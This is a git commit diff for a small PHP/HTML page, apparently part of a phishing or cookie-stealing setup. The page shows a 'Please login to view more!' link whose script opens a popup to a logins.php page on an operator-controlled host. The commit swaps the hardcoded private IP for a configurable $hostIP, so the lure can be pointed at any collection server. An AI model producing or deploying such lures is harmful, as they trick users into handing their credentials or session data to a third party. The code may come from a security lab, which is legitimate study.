489d608d889b5dda0b5475cd337fec2b1b9692b2
r845tjie945tx <appingmap@gmail.com>
2020-02-02 15:52:00 +0100

    Update a2.php

--- a2.php
+++ a2.php
@@ -1,9 +1,14 @@
+<?php
+include("config.php");
+?>
 <!DOCTYPE html>
 <html lang="en-US">
 <head>
 	<meta charset="utf-8">
 </head>
 <body>
-	<a href="http://" onclick="myFunction()">Please login to view more!</a><script>function myFunction(){window.open("http://192.168.1.58/cookie4/logins.php","_blank","width=500,height=500");}</script>
+	<?php
+	echo "<a href=\"http://\" onclick=\"myFunction()\">Please login to view more!</a><script>function myFunction(){window.open(\"http://".$hostIP."/cookie4/logins.php\",\"_blank\",\"width=500,height=500\");}</script>";
+	?>
 </body>
 </html>
